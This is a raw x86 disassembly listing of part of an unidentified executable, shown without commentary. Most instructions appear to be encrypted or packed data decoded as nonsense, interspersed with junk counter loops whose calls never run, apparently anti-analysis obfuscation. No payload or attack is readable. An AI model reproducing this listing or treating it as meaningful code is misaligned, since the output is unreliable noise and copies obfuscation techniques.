  408c51:	jle    0x408c5f
  408c53:	or     edi,0x11
  408c56:	lods   eax,DWORD PTR ds:[esi]
  408c57:	outs   dx,DWORD PTR ds:[esi]
  408c58:	mul    DWORD PTR [edi+0x71abd055]
  408c5e:	mov    bl,BYTE PTR [ebx+0x26]
  408c61:	rcl    BYTE PTR [esi],cl
  408c63:	cmp    al,0x75
  408c65:	cld    
  408c66:	nop
  408c67:	popf   
  408c68:	adc    ch,BYTE PTR [ecx+0x2dda2550]
  408c6e:	cdq    
  408c6f:	or     DWORD PTR [edx],ebx
  408c71:	mov    esi,0x8eb0c46b
  408c76:	lods   eax,DWORD PTR ds:[esi]
  408c77:	jo     0x408ccb
  408c79:	pop    es
  408c7a:	(bad)  
  408c7b:	jmp    0x408c98
  408c7d:	in     al,dx
  408c7e:	(bad)  
  408c7f:	in     eax,dx
  408c80:	add    DWORD PTR [edi-0x199b1198],esi
  408c86:	clc    
  408c87:	ja     0x408c83
  408c89:	adc    eax,0xe1bfb967
  408c8e:	sbb    eax,0xfd60354
  408c93:	scas   eax,DWORD PTR es:[edi]
  408c94:	xlat   BYTE PTR ds:[ebx]
  408c95:	sub    DWORD PTR [eax],edx
  408c97:	mov    eax,DWORD PTR [ebp-0x14]
  408c9a:	jmp    0x408756
  408c9f:	mov    eax,DWORD PTR [ebp-0xc]
  408ca2:	mov    edx,DWORD PTR [ebp-0x18]
  408ca5:	jmp    0x408e2c
  408caa:	test   ecx,ebx
  408cac:	stc    
  408cad:	test   BYTE PTR [ecx+0x64],ah
  408cb0:	sbb    ecx,0x67327607
  408cb6:	or     edx,DWORD PTR [eax]
  408cb8:	icebp  
  408cb9:	int    0x14
  408cbb:	fdivr  QWORD PTR [esi+0x7e]
  408cbe:	in     al,0x7f
  408cc0:	jle    0x408d40
  408cc2:	sub    al,0xc9
  408cc4:	cmc    
  408cc5:	scas   eax,DWORD PTR es:[edi]
  408cc6:	mov    ah,0x70
  408cc8:	adc    DWORD PTR [ebp-0x2c16fb16],eax
  408cce:	mov    gs,WORD PTR [esi+ebx*8-0x32]
  408cd2:	jne    0x408ce8
  408cd4:	or     bl,dl
  408cd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408cd7:	aas    
  408cd8:	retf   
  408cd9:	shr    BYTE PTR [ebx],0xbd
  408cdc:	cld    
  408cdd:	and    esp,esp
  408cdf:	xor    ecx,edi
  408ce1:	out    dx,al
  408ce2:	cdq    
  408ce3:	lahf   
  408ce4:	mov    esi,0x4f867380
  408ce9:	or     ebx,ebp
  408ceb:	push   ds
  408cec:	dec    eax
  408ced:	xchg   ecx,eax
  408cee:	adc    cl,bl
  408cf0:	outs   dx,DWORD PTR ds:[esi]
  408cf2:	daa    
  408cf3:	leave  
  408cf4:	test   DWORD PTR [edi+0x1c],esi
  408cf7:	push   0x4e
  408cf9:	outs   dx,DWORD PTR ds:[esi]
  408cfa:	jecxz  0x408d24
  408cfc:	or     BYTE PTR [ebp-0x49],0xe2
  408d00:	xor    ch,bh
  408d02:	lock push ds
  408d04:	xchg   ebx,eax
  408d05:	sbb    al,0xdd
  408d07:	(bad)  
  408d08:	jmp    0x9e0e:0xcea3997f
  408d0f:	cdq    
  408d10:	imul   dx,WORD PTR [edi],0x1
  408d14:	sub    DWORD PTR [esi-0x60],ecx
  408d17:	lods   eax,DWORD PTR ds:[esi]
  408d18:	mov    eax,0x1d776c83
  408d1d:	add    ah,BYTE PTR [ebx-0x3770ddb2]
  408d23:	or     DWORD PTR [ebp-0x80],0xbbfa3614
  408d2a:	mov    bh,0x63
  408d2c:	xchg   edx,eax
  408d2d:	mov    ah,0x5b
  408d2f:	fst    DWORD PTR [ecx+0x7e14e57e]
  408d35:	jle    0x408cd6
  408d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d38:	jmp    0x71b516e8
  408d3d:	or     BYTE PTR [edi+0x9],cl
  408d40:	jg     0x408d12
  408d42:	jnp    0x408d21
  408d44:	ins    DWORD PTR es:[di],dx
  408d46:	xchg   di,ax
  408d48:	loopne 0x408d77
  408d4a:	jmp    0xab4f:0xd41d6d96
  408d51:	add    BYTE PTR [edx+0x17cc88bc],0x8c
  408d58:	xchg   ebp,eax
  408d59:	push   es
  408d5a:	push   cs
  408d5b:	mov    bl,0x99
  408d5d:	les    ecx,FWORD PTR [ecx+0x26a5965a]
  408d63:	push   eax
  408d64:	out    dx,al
  408d65:	iret   
  408d66:	(bad)  
  408d68:	mov    ecx,0x8ca5b34c
  408d6d:	dec    eax
  408d6e:	jl     0x408d26
  408d70:	popa   
  408d71:	add    al,0xf8
  408d73:	mov    al,0xe1
  408d75:	inc    ecx
  408d76:	ret    0x1217
  408d79:	mov    ebx,0xf90d618d
  408d7e:	fwait
  408d7f:	xchg   edi,eax
  408d80:	popa   
  408d81:	arpl   WORD PTR [edx],cx
  408d83:	xchg   edx,eax
  408d84:	or     DWORD PTR [ebx+0x3a],esp
  408d87:	leave  
  408d88:	lods   al,BYTE PTR ds:[esi]
  408d89:	adc    eax,0x321815dd
  408d8e:	js     0x408dea
  408d90:	retf   0x46be
  408d93:	imul   eax,DWORD PTR [ecx+esi*4],0x62cfc05c
  408d9a:	mov    esp,0x3445551e
  408d9f:	inc    esi
  408da0:	sub    ah,BYTE PTR [edx+0x3d8448fb]
  408da6:	dec    edi
  408da7:	idiv   ebx
  408da9:	fst    st(4)
  408dab:	dec    esi
  408dac:	add    al,bl
  408dae:	fiadd  DWORD PTR [esi+0x2e602bea]
  408db4:	pop    edi
  408db5:	adc    DWORD PTR [ecx],edx
  408db7:	ss (bad) 
  408db9:	test   DWORD PTR [ecx+ebx*8+0x5778dc69],0xbe3b10c5
  408dc4:	shl    BYTE PTR [esi+ecx*8],cl
  408dc7:	inc    edi
  408dc8:	mov    bl,al
  408dca:	xor    eax,0xd3bd441e
  408dcf:	jne    0x408da1
  408dd1:	jo     0x408d5a
  408dd3:	aad    0xcc
  408dd5:	mov    ds:0xe63706ac,al
  408dda:	sbb    BYTE PTR [eax+ebx*2+0x6f934399],0xec
  408de2:	repnz mov bl,0xe1
  408de5:	mov    bh,0xe2
  408de7:	xor    ecx,DWORD PTR [eax+edx*4+0x37cc88af]
  408dee:	fsubr  QWORD PTR [eax]
  408df0:	addr16 push ebx
  408df2:	inc    ebx
  408df3:	fwait
  408df4:	mov    ds:0xc7c8439d,eax
  408df9:	stc    
  408dfa:	(bad)  
  408dfb:	jp     0x408dba
  408dfd:	ja     0x408da0
  408dff:	sbb    al,0xd2
  408e01:	out    dx,eax
  408e02:	adc    dl,BYTE PTR [edx]
  408e04:	daa    
  408e05:	(bad)  
  408e06:	in     eax,0x67
  408e08:	call   0x94d7afb
  408e0d:	jo     0x408e8b
  408e0f:	push   edi
  408e10:	retf   0x9514
  408e13:	cli    
  408e14:	add    al,0xd1
  408e16:	mov    cl,0x51
  408e18:	pop    esp
  408e19:	sub    ch,cl
  408e1b:	lods   al,BYTE PTR ds:[esi]
  408e1c:	and    DWORD PTR ds:0x83976aa4,edi
  408e22:	in     eax,dx
  408e23:	test   BYTE PTR [ebx-0x78],0xeb
  408e27:	aas    
  408e28:	pop    ss
  408e29:	iret   
  408e2a:	pop    esi
  408e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e2c:	xor    eax,edx
  408e2e:	cmp    eax,0x7aa80c5b
  408e33:	je     0x40858a
  408e39:	mov    eax,DWORD PTR [ebp-0x10]
  408e3c:	add    DWORD PTR [eax],0x7403501
  408e42:	jmp    0x40858a
  408e47:	mov    eax,DWORD PTR [ebp-0x1c]
  408e4a:	jmp    0x408fd1
  408e4f:	xor    eax,0xa417048d
  408e54:	xchg   edi,eax
  408e55:	xor    eax,0xaa1dcad
  408e5a:	jmp    0x875c4f81
  408e5f:	cli    
  408e60:	fnstsw WORD PTR [esi+0x7e]
  408e63:	in     al,0x7f
  408e65:	jle    0x408ee5
  408e67:	sbb    eax,0x339478db
  408e6c:	xchg   ecx,eax
  408e6d:	xchg   BYTE PTR [ebx],ah
  408e6f:	addr16 mov edi,0xeef15cc
  408e75:	jp     0x408eb1
  408e77:	mov    bl,0x4
  408e79:	jno    0x408e5d
  408e7b:	je     0x408ee9
  408e7d:	(bad)  
  408e7e:	and    ecx,DWORD PTR [ebx-0x79]
  408e81:	jns    0x408e4d
  408e83:	jl     0x408edc
  408e85:	cli    
  408e86:	in     eax,dx
  408e87:	mov    bh,0x6d
  408e89:	xchg   edi,eax
  408e8a:	mov    ebp,DWORD PTR [ecx+edi*2]
  408e8d:	push   ebx
  408e8e:	cmp    DWORD PTR [edx+0x17da3a98],0x8e40ac47
  408e98:	adc    al,0x25
  408e9a:	sbb    BYTE PTR [eax-0xf],al
  408e9d:	xor    esi,DWORD PTR [ebx-0x729e9ff]
  408ea3:	mov    edx,0xd0fbf86a
  408ea8:	pop    ebx
  408ea9:	push   ebx
  408eaa:	ror    BYTE PTR [ecx-0x4a],cl
  408ead:	fisttp DWORD PTR [esi-0x5d20425e]
  408eb3:	out    dx,eax
  408eb4:	loope  0x408e8a
  408eb6:	push   cs
  408eb7:	xchg   ebp,eax
  408eb8:	stc    
  408eb9:	bound  esi,QWORD PTR [ecx]
  408ebb:	mov    bl,0xea
  408ebd:	pop    eax
  408ebe:	cmp    al,0x8b
  408ec0:	sub    eax,0x48579bc3
  408ec5:	add    al,0x97
  408ec7:	sub    DWORD PTR fs:[edi+0xa40c512],0x7d
  408ecf:	sub    ebx,DWORD PTR [eax-0x2b]
  408ed2:	fwait
  408ed3:	sub    ebx,DWORD PTR [eax-0x1f]
  408ed6:	fdiv   st,st(3)
  408ed8:	xchg   ebp,eax
  408ed9:	imul   ebp,DWORD PTR [edi+0x40],0x7768b0be
  408ee0:	idiv   BYTE PTR ds:0x26ee4fa3
  408ee6:	mov    BYTE PTR [ecx],0xea
  408ee9:	(bad)  
  408eeb:	dec    edi
  408eec:	jne    0x408ea6
  408eee:	mov    BYTE PTR [edi+0x53f3b8f6],0x1a
  408ef5:	popf   
  408ef6:	jmp    0xed14f429
  408efb:	call   0x46e7:0x1ddb79c0
  408f02:	push   0x3d303566
  408f07:	shl    BYTE PTR ds:0xc477fd15,1
  408f0d:	scas   eax,DWORD PTR es:[edi]
  408f0e:	push   edi
  408f0f:	sbb    esi,ebp
  408f11:	lahf   
  408f12:	ss dec esp
  408f14:	mov    ch,0xa6
  408f16:	adc    dh,BYTE PTR [ebx+0x15]
  408f19:	mov    ebp,esi
  408f1b:	test   DWORD PTR [eax],edx
  408f1d:	add    DWORD PTR [ebp-0x3d6bc1fb],0x58
  408f24:	ror    DWORD PTR [edi+0x27738979],1
  408f2a:	(bad)
  408f2d:	imul   ebx,DWORD PTR [edi+0x69],0x304eb84c
  408f34:	push   eax
  408f35:	sub    al,0xa4
  408f37:	test   eax,0xe4f473ff
  408f3c:	fidivr WORD PTR [edi+0x43119125]
  408f42:	call   0x2f40:0x12480430
  408f49:	jns    0x408faf
  408f4b:	(bad)  
  408f4d:	inc    ebp
  408f4e:	jae    0x408f6e
  408f50:	cmp    eax,0x494f354f
  408f55:	enter  0x7efb,0x44
  408f59:	jp     0x408f2d
  408f5b:	fst    QWORD PTR [ebp-0x66d74c49]
  408f61:	fild   QWORD PTR [ebx-0x4f3a5756]
  408f67:	inc    esp
  408f68:	inc    ecx
  408f69:	pop    ss
  408f6a:	enter  0x217c,0xad
  408f6e:	cwde   
  408f6f:	adc    BYTE PTR [ebp+0x2b],bh
  408f72:	push   ebx
  408f73:	adc    eax,0x9dc920ce
  408f78:	jno    0x408fa3
  408f7a:	aam    0xb8
  408f7c:	bound  esp,QWORD PTR [eax]
  408f7e:	push   eax
  408f7f:	sahf   
  408f80:	fld    DWORD PTR [ebp+0x329ecdc0]
  408f86:	retf   
  408f87:	push   esi
  408f88:	daa    
  408f89:	scas   al,BYTE PTR es:[edi]
  408f8a:	lahf   
  408f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f8c:	mov    ds:0xe1e61772,eax
  408f91:	outs   dx,BYTE PTR ds:[esi]
  408f92:	repz and al,0x2e
  408f96:	std    
  408f97:	sub    al,0x96
  408f99:	inc    esi
  408f9a:	sbb    ebx,edi
  408f9c:	adc    eax,DWORD PTR [esi]
  408f9e:	or     BYTE PTR [eax-0x1505af01],ah
  408fa4:	retf   
  408fa5:	push   edx
  408fa6:	enter  0xa773,0xc8
  408faa:	scas   al,BYTE PTR es:[edi]
  408fab:	(bad)  
  408fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408fad:	add    ecx,DWORD PTR [edi-0x2fc8e89f]
  408fb3:	sbb    BYTE PTR [ecx],dh
  408fb5:	adc    ecx,DWORD PTR ds:0x4c5d9676
  408fbb:	push   es
  408fbc:	jne    0x408f9e
  408fbe:	sbb    dl,0x41
  408fc1:	or     eax,0x41e15fb2
  408fc6:	adc    al,cl
  408fc8:	scas   al,BYTE PTR es:[edi]
  408fc9:	test   al,0x1b
  408fcb:	dec    edx
  408fcc:	adc    eax,0x44eafcee
  408fd1:	cmp    DWORD PTR [eax],edi
  408fd3:	je     0x40858a
  408fd9:	mov    eax,0x800f1c9a
  408fde:	jmp    0x4088e1
  408fe3:	push   ebp
  408fe4:	mov    ebp,esp
  408fe6:	sub    esp,0x20
  408fe9:	sub    ecx,eax
  408feb:	mov    eax,ds:0x413bde
  408ff0:	and    DWORD PTR ds:0x4337af,0x0
  408ffa:	jmp    0x40900c
  408fff:	mov    ecx,DWORD PTR ds:0x4337af
  409005:	inc    ecx
  409006:	mov    DWORD PTR ds:0x4337af,ecx
  40900c:	cmp    DWORD PTR ds:0x4337af,0x1c
  409013:	jae    0x409040
  409019:	cmp    DWORD PTR ds:0x4337af,0x20
  409020:	jne    0x40903b
  409026:	push   0x4819
  40902b:	push   0x30ae
  409030:	push   0x3675
  409035:	call   DWORD PTR ds:0x412014
  40903b:	jmp    0x408fff
  409040:	mov    eax,DWORD PTR [eax+0x198]
  409046:	mov    DWORD PTR [ebp-0x8],eax
  409049:	and    DWORD PTR ds:0x4337eb,0x0
  409053:	mov    ecx,DWORD PTR ds:0x4337eb
  409059:	inc    ecx
  40905a:	mov    DWORD PTR ds:0x4337eb,ecx
  409060:	cmp    DWORD PTR ds:0x4337eb,0x1c
  409067:	jne    0x409085
  40906d:	push   0x43382f
  409072:	push   0x494f
  409077:	push   0x43389a
  40907c:	push   DWORD PTR [ebp-0x24]
  40907f:	call   DWORD PTR ds:0x412394
  409085:	cmp    DWORD PTR ds:0x4337eb,0x13
  40908c:	jb     0x409053
  409092:	mov    eax,DWORD PTR [ebp+0x8]
  409095:	and    ecx,DWORD PTR ds:0x4337f3
  40909b:	mov    ecx,DWORD PTR [ebp-0x8]
  40909e:	sbb    DWORD PTR ds:0x433803,0x43383b
  4090a8:	push   ebx
  4090a9:	xor    DWORD PTR ds:0x433777,0x7c2a
  4090b3:	push   esi
  4090b4:	mov    esi,DWORD PTR ds:0x4337c7
  4090ba:	mov    ebx,DWORD PTR ds:0x4337db
  4090c0:	sub    ebx,esi
  4090c2:	or     esi,DWORD PTR [esi+ebx*1]
  4090c5:	mov    esi,0x7510854
  4090ca:	xor    eax,esi
  4090cc:	adc    DWORD PTR ds:0x4337a7,0x43372f
  4090d6:	push   edi
  4090d7:	mov    edi,0x32729b
  4090dc:	and    ebx,DWORD PTR ds:0x433727
  4090e2:	add    eax,edi
  4090e4:	mov    DWORD PTR [ecx],eax
  4090e6:	or     DWORD PTR ds:0x43383b,ebx
  4090ec:	lea    eax,[ebp-0x4]
  4090ef:	mov    DWORD PTR [ebp-0x10],eax
  4090f2:	mov    eax,DWORD PTR [ebp+0x8]
  4090f5:	mov    ecx,DWORD PTR [ebp-0x10]
  4090f8:	xor    eax,esi
  4090fa:	sbb    ebx,0x3e7b
  409100:	add    eax,edi
  409102:	mov    DWORD PTR ds:0x433713,0x17
  40910c:	cmp    DWORD PTR ds:0x433713,0x0
  409113:	je     0x40914b
  409119:	cmp    DWORD PTR ds:0x433713,0x27
  409120:	jne    0x409139
  409126:	push   0x3901
  40912b:	push   0x70c3
  409130:	push   DWORD PTR [ebp-0x1c]
  409133:	call   DWORD PTR ds:0x412398
  409139:	mov    ebx,DWORD PTR ds:0x433713
  40913f:	dec    ebx
  409140:	mov    DWORD PTR ds:0x433713,ebx
  409146:	jmp    0x40910c
  40914b:	mov    DWORD PTR [ecx],eax
  40914d:	neg    DWORD PTR ds:0x4337a7
  409153:	jmp    0x409474
  409158:	add    eax,0x73dd76a0
  40915d:	jmp    0x619bf1f7
  409162:	mov    ch,0x2
  409164:	or     BYTE PTR [edx-0x259f82c1],0x7e
  40916b:	jle    0x4091e7
  40916d:	jge    0x4091ed
  40916f:	jle    0x409100
  409171:	sbb    DWORD PTR ds:0x2c22bd73,0x5451917
  40917b:	mov    dh,0xd3
  40917d:	(bad)  
  40917e:	xchg   edx,eax
  40917f:	and    eax,0x39d2a99d
  409184:	mov    bl,0x13
  409186:	sti    
  409187:	and    esi,DWORD PTR [ebp-0x33]
  40918a:	pop    edx
  40918b:	mov    bh,0x43
  40918d:	cli    
  40918e:	test   DWORD PTR [esi],edx
  409190:	push   es
  409191:	add    dl,ah
  409193:	fldenv [edi+0x51]
  409196:	cmp    eax,0x3944817f
  40919b:	jmp    0xbb02:0xf87f44ef
  4091a2:	out    0x7a,eax
  4091a4:	mov    ds:0x36562d8b,eax
  4091a9:	xchg   edx,eax
  4091aa:	(bad)  
  4091ab:	shl    bl,1
  4091ad:	jmp    0x409195
  4091af:	loope  0x4091ad
  4091b1:	out    0x74,al
  4091b3:	pop    ss
  4091b4:	pop    esp
  4091b5:	push   ss
  4091b6:	pop    esi
  4091b7:	cmp    al,0xb8
  4091b9:	or     ebp,DWORD PTR [eax]
  4091bb:	stc    
  4091bc:	std    
  4091bd:	pop    esp
  4091be:	dec    ebp
  4091bf:	add    BYTE PTR [ecx],al
  4091c1:	xor    edx,DWORD PTR [ebp-0x45]
  4091c4:	outs   dx,DWORD PTR ds:[esi]
  4091c5:	std    
  4091c6:	pop    eax
  4091c7:	nop
  4091c8:	sub    eax,0xe82973ca
  4091cd:	dec    esp
  4091ce:	and    edi,DWORD PTR [edx-0x51735193]
  4091d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091d5:	mov    WORD PTR [ecx+ebp*8-0x4d560eb4],?
  4091dc:	cwde   
  4091dd:	ins    DWORD PTR es:[edi],dx
  4091de:	add    DWORD PTR [ebp+0x464ec105],esi
  4091e4:	fwait
  4091e5:	add    eax,0xbd9cb485
  4091ea:	cmp    bh,BYTE PTR ds:0x1fe17e9d
  4091f0:	or     BYTE PTR [eax],cl
  4091f2:	aad    0x6e
  4091f4:	sahf   
  4091f5:	imul   eax,DWORD PTR [esp+eax*4-0x5b],0xa1b8191a
  4091fd:	jae    0x4091a0
  4091ff:	call   0x830482e5
  409204:	gs dec ecx
  409206:	int3   
  409207:	shl    DWORD PTR [eax+0x31],1
  40920a:	jb     0x409287
  40920c:	jp     0x409190
  40920e:	stos   DWORD PTR es:[edi],eax
  40920f:	sahf   
  409210:	dec    edi
  409211:	and    eax,0xa218bf71
  409216:	cmp    DWORD PTR [esi-0x4d8a1752],0x65f5a83
  409220:	ja     0x4091c0
  409222:	push   esp
  409223:	or     BYTE PTR [eax+0x689cabda],al
  409229:	mov    dh,0x32
  40922b:	call   0xed5622c3
  409230:	pusha  
  409231:	mov    WORD PTR [ebp-0x6abb86d8],?
  409237:	pop    es
  409238:	inc    eax
  409239:	cmp    al,0x9e
  40923b:	push   ecx
  40923c:	mul    DWORD PTR [bx+0x1662]
  409241:	mov    ch,0x84
  409243:	or     eax,esp
  409245:	imul   esp,ebp,0xd1accc11
  40924b:	and    BYTE PTR [ebp+0x5f],0xec
  40924f:	popf   
  409250:	push   ds
  409251:	mov    ds:0xa2809e80,al
  409256:	or     BYTE PTR [ebx-0x431351a7],0x5a
  40925d:	int    0xa5
  40925f:	mov    DWORD PTR gs:[edx+0x42],esi
  409263:	test   BYTE PTR [eax],ah
  409265:	test   ebx,edi
  409267:	(bad)  
  409268:	std    
  409269:	stos   BYTE PTR es:[edi],al
  40926a:	cli    
  40926b:	(bad)  
  40926c:	outs   dx,BYTE PTR ds:[esi]
  40926d:	jmp    0x4092c8
  40926f:	mov    edx,0x684e48cb
  409274:	fnstenv [eax]
  409276:	dec    edi
  409277:	shr    bh,0xfe
  40927a:	and    DWORD PTR [esi],edi
  40927c:	outs   dx,DWORD PTR ds:[esi]
  40927d:	jle    0x4092f2
  40927f:	jne    0x40928d
  409281:	arpl   WORD PTR [ebp-0x1c74acf1],bp
  409287:	es int 0x39
  40928a:	bound  ebx,QWORD PTR [edi]
  40928c:	clc    
  40928d:	mov    cl,0x33
  40928f:	outs   dx,BYTE PTR ds:[esi]
  409290:	xlat   BYTE PTR ds:[ebx]
  409291:	pop    ebx
  409292:	out    dx,eax
  409293:	inc    esp
  409294:	jne    0x409282
  409296:	pop    ds
  409297:	pop    esp
  409298:	xor    esp,esp
  40929a:	sbb    BYTE PTR [edi+ecx*4+0x120b20d6],bh
  4092a1:	popa   
  4092a2:	ss stc 
  4092a4:	inc    eax
  4092a5:	aaa    
  4092a6:	bound  esp,QWORD PTR [esi]
  4092a8:	jl     0x4092c2
  4092aa:	stos   DWORD PTR es:[edi],eax
  4092ab:	retf   
  4092ac:	or     edi,ebx
  4092ae:	mov    WORD PTR [eax],?
  4092b0:	lea    ebx,[edx]
  4092b2:	lds    edi,FWORD PTR [ebx+0x18f0c79c]
  4092b8:	retf   
  4092b9:	sbb    eax,0xbd9406c2
  4092be:	in     eax,0xfb
  4092c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092c1:	cwde   
  4092c2:	jecxz  0x409263
  4092c4:	retf   
  4092c5:	jl     0x4092ed
  4092c7:	pop    ebx
  4092c8:	adc    eax,0x27ff27ba
  4092cd:	dec    edx
  4092ce:	stos   DWORD PTR es:[edi],eax
  4092cf:	outs   dx,BYTE PTR ds:[esi]
  4092d0:	mov    cl,0x5e
  4092d2:	mov    eax,ds:0x1e9565b7
  4092d7:	xor    dl,bh
  4092d9:	imul   ebx,DWORD PTR [eax],0x2ad05ea6
  4092df:	sbb    bl,BYTE PTR [edi]
  4092e1:	loope  0x40926c
  4092e3:	mov    dl,0x87
  4092e5:	outs   dx,BYTE PTR ds:[esi]
  4092e6:	xor    eax,0x1342b7f2
  4092eb:	icebp  
  4092ec:	stos   DWORD PTR es:[edi],eax
  4092ed:	mov    al,0x27
  4092ef:	inc    esp
  4092f0:	inc    ecx
  4092f1:	mov    cl,0x2a
  4092f3:	sti    
  4092f4:	cmc    
  4092f5:	adc    BYTE PTR [eax+0x32],al
  4092f8:	xchg   ecx,eax
  4092f9:	in     eax,dx
  4092fa:	xchg   edx,eax
  4092fb:	in     al,0x2b
  4092fd:	mov    ebp,edi
  4092ff:	pop    esp
  409300:	mov    esp,0x23a4e1bd
  409305:	or     al,0xe8
  409307:	adc    ebx,DWORD PTR ds:0x5ceb828c
  40930d:	jmp    0x40934d
  40930f:	test   DWORD PTR [edi],edi
  409311:	jp     0x409360
  409313:	jbe    0x4092ac
  409315:	pop    ebx
  409316:	jl     0x40936a
  409318:	in     eax,0x59
  40931a:	inc    esi
  40931b:	fsub   DWORD PTR [esi-0x20]
  40931e:	arpl   WORD PTR [esi+ecx*8+0x37],sp
  409322:	or     BYTE PTR [ebp+0x701ae327],bh
  409328:	xor    BYTE PTR [ebp+esi*4-0x7c30f90b],dh
  40932f:	add    BYTE PTR [ebp-0x65d4837b],0x39
  409336:	mov    dl,0x34
  409338:	neg    BYTE PTR [esi]
  40933a:	mov    bh,0xf5
  40933c:	push   edi
  40933d:	jnp    0x409323
  40933f:	aas    
  409340:	iret   
  409341:	fxch   st(7)
  409343:	cmp    DWORD PTR [edi+0x394a4bfd],0xd9f4c10b
  40934d:	into   
  40934e:	add    DWORD PTR [esi],0x46040260
  409354:	mov    edi,DWORD PTR [bx+di+0x16]
  409358:	pop    edi
  409359:	aam    0x14
  40935b:	push   0xfe9396d6
  409360:	push   cs
  409361:	pop    ds
  409362:	cmp    ebp,DWORD PTR [ebx+ecx*1+0x26668282]
  409369:	inc    edx
  40936a:	sbb    dh,BYTE PTR [eax+esi*4-0x3a]
  40936e:	cdq    
  40936f:	imul   ecx,ebx,0xb9811543
  409375:	scas   al,BYTE PTR es:[edi]
  409376:	out    0x2f,eax
  409378:	and    esi,ecx
  40937a:	or     DWORD PTR [ecx+0x26],edx
  40937d:	jns    0x409320
  40937f:	dec    esp
  409380:	pop    esi
  409381:	scas   al,BYTE PTR es:[edi]
  409382:	pushf  
  409383:	ds jno 0x4093a5
  409386:	adc    BYTE PTR [edx+0x67],dh
  409389:	push   esp
  40938a:	not    al
  40938c:	xor    BYTE PTR cs:[eax],ah
  40938f:	mov    eax,ds:0x80df5b60
  409394:	(bad)  
  409395:	lahf   
  409396:	sub    BYTE PTR [ecx],ah
  409398:	shl    DWORD PTR [esp+edi*8],0x53
  40939c:	mov    dl,0xb3
  40939e:	xchg   ebx,eax
  40939f:	jle    0x4093d8
  4093a1:	stos   DWORD PTR es:[edi],eax
  4093a2:	inc    ebp
  4093a3:	jecxz  0x409326
  4093a5:	ret    
  4093a6:	push   es
  4093a7:	cmp    ax,0x5d0f
  4093ab:	mov    ah,0xd4
  4093ad:	dec    edx
  4093ae:	paddq  mm3,QWORD PTR [edi-0x1d7c58c1]
  4093b5:	xchg   esi,eax
  4093b6:	jnp    0x4093c6
  4093b8:	push   esi
  4093b9:	sbb    al,BYTE PTR [ebx-0x2f796f92]
  4093bf:	clc    
  4093c0:	jae    0x409431
  4093c2:	arpl   WORD PTR [eax+eiz*2],di
  4093c5:	dec    ebp
  4093c6:	and    DWORD PTR [edx],edx
  4093c8:	rdmsr  
  4093ca:	jnp    0x4093f4
  4093cc:	jge    0x40939a
  4093ce:	mov    esi,0x6f647e2
  4093d3:	cdq    
  4093d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4093d5:	mov    ebp,0x6a7564ef
  4093da:	dec    ecx
  4093db:	adc    BYTE PTR [ecx],dl
  4093dd:	sbb    edi,edx
  4093df:	fnstenv [esi-0x1b]
  4093e2:	stc    
  4093e3:	dec    esp
  4093e4:	pushf  
  4093e5:	cmp    bh,BYTE PTR [edx]
  4093e7:	xchg   BYTE PTR [esi+0x7c],al
  4093ea:	lods   eax,DWORD PTR ds:[esi]
  4093eb:	das    
  4093ec:	xor    edi,DWORD PTR [edi-0x7f]
  4093ef:	cmp    ch,BYTE PTR [edx+0x2f53ba07]
  4093f5:	in     eax,0x27
  4093f7:	mov    gs:0x9e958811,eax
  4093fd:	clc    
  4093fe:	bnd jmp 0x409449
  409401:	dec    ecx
  409402:	inc    ecx
  409403:	hlt    
  409404:	sub    eax,DWORD PTR cs:[ebx+0x29]
  409408:	xchg   BYTE PTR [edx],dh
  40940a:	cmp    eax,0x4fcafe5e
  40940f:	loop   0x40945b
  409411:	imul   edx,DWORD PTR [edi+eax*4],0x19
  409415:	call   0xc41963cf
  40941a:	frstor [edi+0x83d145d]
  409420:	jp     0x409422
  409422:	xor    eax,0x7f5ebcf3
  409427:	and    eax,0x7166a144
  40942c:	dec    ebx
  40942d:	add    DWORD PTR [bp-0x1f],0xa1835cb5
  409435:	stc    
  409436:	aas    
  409437:	aam    0x46
  409439:	pop    edx
  40943a:	es mov al,dh
  40943d:	fstp   st(2)
  40943f:	add    ecx,esi
  409441:	push   DWORD PTR [edx+0x7d]
  409444:	nop
  409445:	jne    0x4093da
  409447:	mov    al,ds:0xac4d396e
  40944c:	pop    edi
  40944d:	stos   DWORD PTR es:[edi],eax
  40944e:	jae    0x40942d
  409450:	aaa    
  409451:	and    DWORD PTR [esi-0x41],esi
  409454:	xchg   BYTE PTR [ecx],ch
  409456:	jmp    0x6fc:0xa09dbc2f
  40945d:	xchg   ebx,eax
  40945e:	inc    esp
  40945f:	mov    ?,WORD PTR [esi+0x51]
  409462:	sbb    eax,DWORD PTR [eax]
  409464:	jp     0x40947b
  409466:	in     eax,dx
  409467:	jbe    0x409461
  409469:	test   eax,0x5a815d3f
  40946e:	push   es
  40946f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409470:	sub    edi,ebp
  409472:	xchg   esp,eax
  409473:	faddp  st(7),st
  409475:	inc    ebp
  409476:	in     al,dx
  409477:	xor    DWORD PTR [ebp+0x2581f89c],eax
  40947d:	sub    edi,DWORD PTR [eax]
  40947f:	inc    ebx
  409480:	add    BYTE PTR [eax],al
  409482:	add    BYTE PTR [eax],al
  409484:	add    BYTE PTR [ebx],dh
  409486:	leave  
  409487:	add    ecx,DWORD PTR ds:0x43382b
  40948d:	inc    ecx
  40948e:	mov    DWORD PTR ds:0x43382b,ecx
  409494:	cmp    DWORD PTR ds:0x43382b,0x23
  40949b:	jne    0x4094bf
  4094a1:	push   0x7f04
  4094a6:	push   DWORD PTR [ebp-0xc]
  4094a9:	push   DWORD PTR [ebp-0x28]
  4094ac:	push   0x10bc
  4094b1:	push   DWORD PTR [ebp-0x10]
  4094b4:	push   0x1509
  4094b9:	call   DWORD PTR ds:0x41239c
  4094bf:	cmp    DWORD PTR ds:0x43382b,0x13
  4094c6:	jb     0x409485
  4094cc:	sub    DWORD PTR ds:0x433713,ecx
  4094d2:	lea    eax,[ebp-0x14]
  4094d5:	and    DWORD PTR ds:0x433777,0x0
  4094df:	jmp    0x4094f1
  4094e4:	mov    ebx,DWORD PTR ds:0x433777
  4094ea:	inc    ebx
  4094eb:	mov    DWORD PTR ds:0x433777,ebx
